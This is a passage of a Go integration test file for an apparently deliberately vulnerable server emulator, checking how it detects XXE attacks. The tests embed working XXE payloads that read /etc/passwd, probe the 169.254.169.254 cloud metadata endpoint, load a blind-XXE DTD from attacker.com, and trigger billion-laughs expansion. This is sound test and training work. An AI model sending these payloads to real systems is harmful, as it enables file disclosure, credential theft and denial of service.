	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["parsed"] != true {
		t.Errorf("Expected parsed=true")
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for XXE payload")
	}

	if data["attack_type"] != "file_disclosure" {
		t.Errorf("Expected attack_type 'file_disclosure', got '%v'", data["attack_type"])
	}
}

func TestIntegration_XXE_FormField(t *testing.T) {
	configContent := `
app:
  name: "XXE Form Test"
  port: 18101

endpoints:
  - path: "/api/xml"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: xxe
        placement: form_field
        param: xml_data
        config:
          filter: none
          show_decoded: true
          emulate_resolution: true
          allow_file_read: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with SSRF payload
	xxePayload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>test</foo>`

	form := strings.NewReader("xml_data=" + xxePayload)
	req := httptest.NewRequest("POST", "/api/xml", form)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true")
	}

	if data["attack_type"] != "ssrf" {
		t.Errorf("Expected attack_type 'ssrf', got '%v'", data["attack_type"])
	}
}

func TestIntegration_XXE_WithFilter(t *testing.T) {
	configContent := `
app:
  name: "XXE Filter Test"
  port: 18102

endpoints:
  - path: "/xml/filtered"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: xxe
        placement: form_field
        param: xml_data
        config:
          filter: external_entities
          show_decoded: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with XXE payload - should be blocked by external_entities filter
	xxePayload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>test</foo>`

	form := strings.NewReader("xml_data=" + xxePayload)
	req := httptest.NewRequest("POST", "/xml/filtered", form)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	// Should be blocked by external_entities filter
	if data["blocked"] != true {
		t.Errorf("Expected blocked=true when using external_entities filter")
	}
}

func TestIntegration_XXE_BlindXXE(t *testing.T) {
	configContent := `
app:
  name: "Blind XXE Test"
  port: 18103

endpoints:
  - path: "/api/blind"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: xxe
        placement: json_field
        param: xml_data
        config:
          filter: none
          show_decoded: false
          emulate_resolution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with blind XXE parameter entity payload - use JSON to avoid URL encoding issues
	jsonBody := `{"xml_data": "<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><foo>test</foo>"}`

	req := httptest.NewRequest("POST", "/api/blind", strings.NewReader(jsonBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for blind XXE")
	}

	if data["attack_type"] != "blind_xxe" {
		t.Errorf("Expected attack_type 'blind_xxe', got '%v'", data["attack_type"])
	}
}

func TestIntegration_XXE_JSONField(t *testing.T) {
	configContent := `
app:
  name: "XXE JSON Test"
  port: 18104

endpoints:
  - path: "/api/process"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: xxe
        placement: json_field
        param: xml
        config:
          filter: none
          show_decoded: true
          emulate_resolution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with XXE payload in JSON field
	jsonBody := `{"xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}`

	req := httptest.NewRequest("POST", "/api/process", strings.NewReader(jsonBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["parsed"] != true {
		t.Errorf("Expected parsed=true")
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true")
	}
}

func TestIntegration_XXE_SafeXML(t *testing.T) {
	configContent := `
app:
  name: "XXE Safe Test"
  port: 18105

endpoints:
  - path: "/xml/parse"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: xxe
        placement: form_field
        param: xml_data
        config:
          filter: none
          show_decoded: true
          emulate_resolution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with safe XML (no XXE)
	safeXML := `<user><name>John</name><email>john@example.com</email></user>`

	form := strings.NewReader("xml_data=" + safeXML)
	req := httptest.NewRequest("POST", "/xml/parse", form)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["parsed"] != true {
		t.Errorf("Expected parsed=true for valid XML")
	}

	if data["exploitable"] != false {
		t.Errorf("Expected exploitable=false for safe XML")
	}

	if data["root_element"] != "user" {
		t.Errorf("Expected root_element 'user', got '%v'", data["root_element"])
	}
}

func TestIntegration_XXE_DoSBillionLaughs(t *testing.T) {
	configContent := `
app:
  name: "XXE DoS Test"
  port: 18106

endpoints:
  - path: "/xml/parse"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: xxe
        placement: json_field
        param: xml_data
        config:
          filter: none
          show_decoded: true
          emulate_resolution: false
          max_entity_depth: 3
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with billion laughs pattern - use JSON to avoid URL encoding issues with & characters
	jsonBody := `{"xml_data": "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>test</lolz>"}`

	req := httptest.NewRequest("POST", "/xml/parse", strings.NewReader(jsonBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for billion laughs")
	}

	if data["attack_type"] != "denial_of_service" {
		t.Errorf("Expected attack_type 'denial_of_service', got '%v'", data["attack_type"])
	}
}

// =============================================================================
// Helper Functions
// =============================================================================

func isAlphanumeric(s string) bool {
	for _, r := range s {
		if !((r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9')) {
			return false
		}
	}
	return len(s) > 0
}

func isSafeFilename(s string) bool {
	for _, r := range s {
		if !((r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '.' || r == '_') {
			return false
		}
	}
	return len(s) > 0 && !strings.Contains(s, "..")
}

var _ = bytes.Buffer{}
